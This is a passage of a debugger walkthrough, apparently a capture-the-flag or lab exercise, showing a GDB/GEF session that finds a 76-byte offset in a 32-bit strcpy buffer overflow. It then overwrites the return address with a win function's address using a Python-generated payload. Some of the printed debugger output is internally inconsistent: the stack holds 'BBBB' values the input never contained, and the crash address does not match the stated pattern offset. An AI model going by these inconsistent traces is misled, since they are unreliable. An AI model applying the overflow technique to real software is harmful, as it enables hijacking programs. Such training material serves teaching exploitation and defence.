<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Start GDB with GEF for 32-bit binary</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gdb </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-q</span><span class="token plain"> vuln32</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Initial security analysis</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ checksec</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">+</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> checksec </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">for</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;/home/user/vuln32&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Canary                        </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">:</span><span class="token plain"> ‚úò </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">NX                            </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">:</span><span class="token plain"> ‚úò </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PIE                           </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">:</span><span class="token plain"> ‚úò </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Fortify                       </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">:</span><span class="token plain"> ‚úò </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">RelRO                         </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">:</span><span class="token plain"> Partial</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Analyze binary structure</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ info functions</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">All defined functions:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x08049000  _init</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x08049030  printf@plt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x08049040  strcpy@plt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x08049050  system@plt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x08049060  __libc_start_main@plt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x08049070  _start</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x080490a0  __x86.get_pc_thunk.bx</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x080490b0  deregister_tm_clones</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x080490f0  register_tm_clones</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x08049130  __do_global_dtors_aux</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x08049160  frame_dummy</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x08049169  win</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x080491a5  vulnerable_function</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x080491d8  main</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Get win function address</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ print win</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$1</span><span class="token plain"> </span><span class="token operator">=</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token operator">&lt;</span><span class="token plain">text variable, no debug info</span><span class="token operator">&gt;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"> 0x8049169 </span><span class="token operator">&lt;</span><span class="token plain">win</span><span class="token operator">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Analyze vulnerable function</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ disassemble vulnerable_function</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Dump of assembler code </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">for</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">function</span><span class="token plain"> vulnerable_function:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x080491a5 </span><span class="token operator">&lt;</span><span class="token plain">+</span><span class="token operator file-descriptor important">0</span><span class="token operator">&gt;</span><span class="token plain">:     push   ebp</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x080491a6 </span><span class="token operator">&lt;</span><span class="token plain">+</span><span class="token operator file-descriptor important">1</span><span class="token operator">&gt;</span><span class="token plain">:     mov    ebp,esp</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x080491a8 </span><span class="token operator">&lt;</span><span class="token plain">+</span><span class="token operator file-descriptor important">3</span><span class="token operator">&gt;</span><span class="token plain">:     sub    esp,0x58</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x080491ab </span><span class="token operator">&lt;</span><span class="token plain">+</span><span class="token operator file-descriptor important">6</span><span class="token operator">&gt;</span><span class="token plain">:     sub    esp,0x8</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x080491ae </span><span class="token operator">&lt;</span><span class="token plain">+</span><span class="token operator file-descriptor important">9</span><span class="token operator">&gt;</span><span class="token plain">:     push   DWORD PTR </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">ebp+0x8</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x080491b1 </span><span class="token operator">&lt;</span><span class="token plain">+1</span><span class="token operator file-descriptor important">2</span><span class="token operator">&gt;</span><span class="token plain">:    push   0x8049264</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x080491b6 </span><span class="token operator">&lt;</span><span class="token plain">+1</span><span class="token operator file-descriptor important">7</span><span class="token operator">&gt;</span><span class="token plain">:    call   0x8049030 </span><span class="token operator">&lt;</span><span class="token plain">printf@plt</span><span class="token operator">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x080491bb </span><span class="token operator">&lt;</span><span class="token plain">+2</span><span class="token operator file-descriptor important">2</span><span class="token operator">&gt;</span><span class="token plain">:    </span><span class="token function" style="color:rgb(80, 250, 123)">add</span><span class="token plain">    esp,0x10</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x080491be </span><span class="token operator">&lt;</span><span class="token plain">+2</span><span class="token operator file-descriptor important">5</span><span class="token operator">&gt;</span><span class="token plain">:    sub    esp,0x8</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x080491c1 </span><span class="token operator">&lt;</span><span class="token plain">+2</span><span class="token operator file-descriptor important">8</span><span class="token operator">&gt;</span><span class="token plain">:    push   DWORD PTR </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">ebp+0x8</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x080491c4 </span><span class="token operator">&lt;</span><span class="token plain">+3</span><span class="token operator file-descriptor important">1</span><span class="token operator">&gt;</span><span class="token plain">:    lea    eax,</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">ebp-0x48</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x080491c7 </span><span class="token operator">&lt;</span><span class="token plain">+3</span><span class="token operator file-descriptor important">4</span><span class="token operator">&gt;</span><span class="token plain">:    push   eax</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x080491c8 </span><span class="token operator">&lt;</span><span class="token plain">+3</span><span class="token operator file-descriptor important">5</span><span class="token operator">&gt;</span><span class="token plain">:    call   0x8049040 </span><span class="token operator">&lt;</span><span class="token plain">strcpy@plt</span><span class="token operator">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x080491cd </span><span class="token operator">&lt;</span><span class="token plain">+4</span><span class="token operator file-descriptor important">0</span><span class="token operator">&gt;</span><span class="token plain">:    </span><span class="token function" style="color:rgb(80, 250, 123)">add</span><span class="token plain">    esp,0x10</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x080491d0 </span><span class="token operator">&lt;</span><span class="token plain">+4</span><span class="token operator file-descriptor important">3</span><span class="token operator">&gt;</span><span class="token plain">:    sub    esp,0x8</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x080491d3 </span><span class="token operator">&lt;</span><span class="token plain">+4</span><span class="token operator file-descriptor important">6</span><span class="token operator">&gt;</span><span class="token plain">:    lea    eax,</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">ebp-0x48</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x080491d6 </span><span class="token operator">&lt;</span><span class="token plain">+4</span><span class="token operator file-descriptor important">9</span><span class="token operator">&gt;</span><span class="token plain">:    push   eax</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x080491d7 </span><span class="token operator">&lt;</span><span class="token plain">+5</span><span class="token operator file-descriptor important">0</span><span class="token operator">&gt;</span><span class="token plain">:    push   0x8049277</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x080491dc </span><span class="token operator">&lt;</span><span class="token plain">+5</span><span class="token operator file-descriptor important">5</span><span class="token operator">&gt;</span><span class="token plain">:    call   0x8049030 </span><span class="token operator">&lt;</span><span class="token plain">printf@plt</span><span class="token operator">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x080491e1 </span><span class="token operator">&lt;</span><span class="token plain">+6</span><span class="token operator file-descriptor important">0</span><span class="token operator">&gt;</span><span class="token plain">:    </span><span class="token function" style="color:rgb(80, 250, 123)">add</span><span class="token plain">    esp,0x10</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x080491e4 </span><span class="token operator">&lt;</span><span class="token plain">+6</span><span class="token operator file-descriptor important">3</span><span class="token operator">&gt;</span><span class="token plain">:    nop</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x080491e5 </span><span class="token operator">&lt;</span><span class="token plain">+6</span><span class="token operator file-descriptor important">4</span><span class="token operator">&gt;</span><span class="token plain">:    leave</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x080491e6 </span><span class="token operator">&lt;</span><span class="token plain">+6</span><span class="token operator file-descriptor important">5</span><span class="token operator">&gt;</span><span class="token plain">:    ret</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">End of assembler dump.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Set breakpoint and analyze stack layout</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">break</span><span class="token plain"> *vulnerable_function+35</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Breakpoint </span><span class="token number">1</span><span class="token plain"> at 0x80491c8: </span><span class="token function" style="color:rgb(80, 250, 123)">file</span><span class="token plain"> vuln32.c, line </span><span class="token number">12</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Generate pattern to find offset</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ pattern create </span><span class="token number">200</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">+</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> Generating a pattern of </span><span class="token number">200</span><span class="token plain"> bytes </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">n</span><span class="token operator">=</span><span class="token number">4</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraa</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Run with pattern</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ run aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraa</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Starting program: /home/user/vuln32 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraa</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">üéØ </span><span class="token number">32</span><span class="token plain">-bit Buffer Overflow Challenge</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">üìç Win </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">function</span><span class="token plain"> address: 0x8049169</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">üìù Input received: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraa</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Breakpoint </span><span class="token number">1</span><span class="token plain">, 0x080491c8 </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token plain"> vulnerable_function </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">input</span><span class="token operator">=</span><span class="token plain">0xffffd2a4 </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraa&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> at vuln32.c:12.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Examine stack layout before strcpy</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ telescope </span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$esp</span><span class="token plain"> </span><span class="token number">20</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0xffffd160‚îÇ+0x0000: 0xffffd178     ‚Üê </span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$esp</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0xffffd164‚îÇ+0x0004: 0xffffd2a4  ‚Üí  </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraa&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0xffffd168‚îÇ+0x0008: 0x00000000</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0xffffd16c‚îÇ+0x000c: 0xf7fc0000  ‚Üí  0x002bf000</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0xffffd170‚îÇ+0x0010: 0x08049250  ‚Üí  </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;üìù Input received: %s</span><span class="token string entity" style="color:rgb(255, 121, 198)">\n</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0xffffd174‚îÇ+0x0014: 0xffffd2a4  ‚Üí  </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraa&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0xffffd178‚îÇ+0x0018: 0x42424242 </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;BBBB&quot;</span><span class="token plain">?</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain">     ‚Üê buffer start </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">ebp-0x48</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0xffffd17c‚îÇ+0x001c: 0x42424242 </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;BBBB&quot;</span><span class="token plain">?</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0xffffd180‚îÇ+0x0020: 0x42424242 </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;BBBB&quot;</span><span class="token plain">?</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">..</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0xffffd1b8‚îÇ+0x0058: 0x42424242 </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;BBBB&quot;</span><span class="token plain">?</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0xffffd1bc‚îÇ+0x005c: 0x00000000</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0xffffd1c0‚îÇ+0x0060: 0xffffd1d8     ‚Üê </span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$ebp</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">saved frame pointer</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0xffffd1c4‚îÇ+0x0064: 0x08049214  ‚Üí  </span><span class="token operator">&lt;</span><span class="token plain">main+5</span><span class="token operator file-descriptor important">9</span><span class="token operator">&gt;</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">add</span><span class="token plain"> esp, 0x10  ‚Üê </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">return</span><span class="token plain"> address</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Continue execution to trigger overflow</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">continue</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Continuing.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">üìã Buffer contents: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraa</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Program received signal SIGSEGV, Segmentation fault.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x62616162 </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token plain"> ?? </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Find the offset to control EIP</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ pattern search </span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$eip</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">+</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> Searching </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">for</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;0x62616162&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">+</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> Found at offset </span><span class="token number">76</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">little-endian search</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> likely</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Verify the offset calculation</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ pattern offset 0x62616162</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">+</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> Searching </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">for</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;0x62616162&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">+</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> Found at offset </span><span class="token number">76</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">little-endian search</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> likely</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Calculate buffer size to EIP</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Buffer starts at ebp-0x48 (72 bytes from ebp)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># EIP is at ebp+4</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Total offset = 72 + 4 = 76 bytes ‚úì</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Create exploit payload</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ run </span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$(</span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">python3 </span><span class="token variable parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-c</span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic"> </span><span class="token variable string" style="color:rgb(255, 121, 198);font-style:italic">&quot;print(&#x27;A&#x27;*76 + &#x27;</span><span class="token variable string entity" style="color:rgb(255, 121, 198);font-style:italic">\x69</span><span class="token variable string entity" style="color:rgb(255, 121, 198);font-style:italic">\x91</span><span class="token variable string entity" style="color:rgb(255, 121, 198);font-style:italic">\x04</span><span class="token variable string entity" style="color:rgb(255, 121, 198);font-style:italic">\x08</span><span class="token variable string" style="color:rgb(255, 121, 198);font-style:italic">&#x27;)&quot;</span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Starting program: /home/user/vuln32 </span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$(</span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">python3 </span><span class="token variable parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-c</span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic"> </span><span class="token variable string" style="color:rgb(255, 121, 198);font-style:italic">&quot;print(&#x27;A&#x27;*76 + &#x27;</span><span class="token variable string entity" style="color:rgb(255, 121, 198);font-style:italic">\x69</span><span class="token variable string entity" style="color:rgb(255, 121, 198);font-style:italic">\x91</span><span class="token variable string entity" style="color:rgb(255, 121, 198);font-style:italic">\x04</span><span class="token variable string entity" style="color:rgb(255, 121, 198);font-style:italic">\x08</span><span class="token variable string" style="color:rgb(255, 121, 198);font-style:italic">&#x27;)&quot;</span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">üéØ </span><span class="token number">32</span><span class="token plain">-bit Buffer Overflow Challenge</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">üìç Win </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">function</span><span class="token plain"> address: 0x8049169</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">üìù Input received: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA©ëä</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">üìã Buffer contents: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA©ëä</span><br></span><span class="token-line" 